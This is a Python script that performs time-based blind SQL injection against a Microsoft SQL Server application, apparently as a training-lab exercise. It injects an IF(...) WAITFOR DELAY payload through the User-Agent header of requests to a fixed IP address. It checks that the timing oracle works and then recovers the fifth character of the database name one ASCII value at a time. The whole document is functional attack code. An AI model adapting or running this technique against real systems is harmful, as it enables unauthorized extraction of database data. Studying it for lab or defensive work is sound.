#!/usr/bin/python3

import requests
import time
import sys

# Define the length of time (in seconds) the server should wait if `q` is `true`
DELAY = 5

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Evaluates `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        "http://10.129.204.197:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"},
        proxies=proxy
    )
    return time.time() - start > DELAY

# Verify that the oracle works by checking if the correct
# values are returned for queries `1=1` and `1=0`
assert oracle("1=1")
assert not oracle("1=0")

# Function to find the fifth letter of db_name()
def find_fifth_letter():
    for c in range(32, 127):  # ASCII range for printable characters
        query = f"ASCII(SUBSTRING(db_name(), 5, 1))={c}"
        if oracle(query):
            return chr(c)
    return None

# Main execution
fifth_letter = find_fifth_letter()
if fifth_letter:
    print(f"The fifth letter of db_name() is '{fifth_letter}'")
else:
    print("Could not determine the fifth letter of db_name()")
